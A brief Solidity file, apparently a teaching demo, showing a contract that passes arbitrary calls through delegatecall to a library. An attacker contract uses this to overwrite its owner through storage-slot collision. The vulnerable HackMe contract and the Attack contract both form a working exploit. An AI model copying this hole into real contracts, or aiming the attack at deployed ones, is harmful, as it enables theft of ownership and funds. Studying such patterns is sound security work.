// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Lib2 {
    address public owner;
    
    function setOwner() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib2 public libre;
    
    constructor(Lib2 _libre) {
        owner = msg.sender;
        libre = Lib2(_libre);
    }
    
    fallback() external payable {
        address(libre).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;
    
    constructor(address _hackMe) {
        hackMe = _hackMe;
    }
    
    function attack() public {
        hackMe.call(abi.encodeWithSignature("setOwner()"));
    }
}